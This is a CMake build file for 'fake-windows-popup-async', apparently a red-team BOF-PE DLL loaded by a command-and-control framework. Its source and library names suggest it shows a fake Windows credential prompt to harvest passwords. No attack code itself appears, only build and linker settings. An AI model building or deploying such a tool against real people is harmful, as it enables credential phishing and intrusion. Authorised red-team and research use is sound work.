cmake_minimum_required(VERSION 3.18)

project(fake-windows-popup-async-bof-pe LANGUAGES C CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

get_filename_component(DEFAULT_BOF_PE_ROOT
    "${CMAKE_CURRENT_SOURCE_DIR}/../../external/BOF-PE" ABSOLUTE)
set(BOF_PE_ROOT "${DEFAULT_BOF_PE_ROOT}" CACHE PATH
    "Path to the NetSPI BOF-PE source checkout")

if(NOT EXISTS "${BOF_PE_ROOT}/common/standalone.cpp")
    message(FATAL_ERROR
        "BOF_PE_ROOT must point to a BOF-PE checkout containing common/standalone.cpp")
endif()

if(NOT CMAKE_SIZEOF_VOID_P EQUAL 8)
    message(FATAL_ERROR "fake-windows-popup-async currently supports x64 only")
endif()

# beacon/ is a local copy of the BOF-PE beacon layer with the async BOF API
# (BeaconWakeup, BeaconGetStopJobEvent) and the BEACON_INIT atexit fix.
# The shared external/BOF-PE/beacon has neither.
set(ASYNC_BEACON_DIR "${CMAKE_CURRENT_SOURCE_DIR}/beacon")

add_library(beacon SHARED
    "${ASYNC_BEACON_DIR}/beacon.cpp"
    "${ASYNC_BEACON_DIR}/beacon.h"
    "${BOF_PE_ROOT}/common/standalone.cpp"
    "${BOF_PE_ROOT}/common/standalone.h"
)
set_target_properties(beacon PROPERTIES PREFIX "" OUTPUT_NAME beacon)
target_compile_definitions(beacon PRIVATE BUILD_BEACON)
target_include_directories(beacon PUBLIC "${ASYNC_BEACON_DIR}")
if(CMAKE_CXX_COMPILER_ID STREQUAL "MSVC")
    target_compile_options(beacon PRIVATE /GS- /MT)
else()
    target_link_options(beacon PRIVATE -static)
endif()

# OC2 runs a BOF-PE as a DLL that exports go (BOF-PE (.dll)). BOF_PE_DLL makes
# BEACON_MAIN and BEACON_INIT no-ops, the CRT DLL startup initializes the CRT.
add_library(fake-windows-popup-async SHARED
    src/credentials.cpp
    src/dimmer.cpp
    src/main.cpp
    src/policy.cpp
    src/prompt.cpp
    src/target.cpp
)

set_target_properties(fake-windows-popup-async PROPERTIES PREFIX "")
target_compile_definitions(fake-windows-popup-async PRIVATE BOF_PE_DLL)

target_include_directories(fake-windows-popup-async PRIVATE
    "${ASYNC_BEACON_DIR}"
    "${CMAKE_CURRENT_SOURCE_DIR}/src"
)

target_link_libraries(fake-windows-popup-async PRIVATE
    beacon
    advapi32
    credui
    gdi32
    netapi32
    ole32
    secur32
    shell32
    user32
)

add_custom_command(TARGET fake-windows-popup-async POST_BUILD
    COMMAND "${CMAKE_COMMAND}" -E copy_if_different
        "$<TARGET_FILE:beacon>"
        "$<TARGET_FILE_DIR:fake-windows-popup-async>"
    COMMENT "Copying standalone beacon.dll beside fake-windows-popup-async")

if(CMAKE_CXX_COMPILER_ID MATCHES "MSVC|Clang")
    target_compile_options(fake-windows-popup-async PRIVATE /GS- /MT /W4 /EHa)
    target_link_options(fake-windows-popup-async PRIVATE
        /MERGE:.gfids=.
        /MERGE:_RDATA=.
        /MERGE:.data=.
        /MERGE:.rdata=.
        /MERGE:.pdata=.
        /SECTION:.,RW
        /MERGE:.discard_data=.discard
    )
else()
    # Unlike the synchronous original, exceptions stay enabled so go can
    # catch std::exception instead of taking down the C2's async thread
    target_compile_options(fake-windows-popup-async PRIVATE
        -Wall -Wextra -Wpedantic -fexceptions)
    # -static links libgcc and libstdc++ into the DLL. The default MinGW DLL
    # linker script is used, BOF-PE's link.ld is for the EXE model.
    target_link_options(fake-windows-popup-async PRIVATE
        -fexceptions
        -static
        -static-libgcc
        -static-libstdc++
        -Wl,--image-base=0x180000000
        -Wl,--subsystem,windows
        -Wl,--strip-all
    )
endif()

install(TARGETS fake-windows-popup-async RUNTIME DESTINATION . LIBRARY DESTINATION . ARCHIVE EXCLUDE_FROM_ALL)
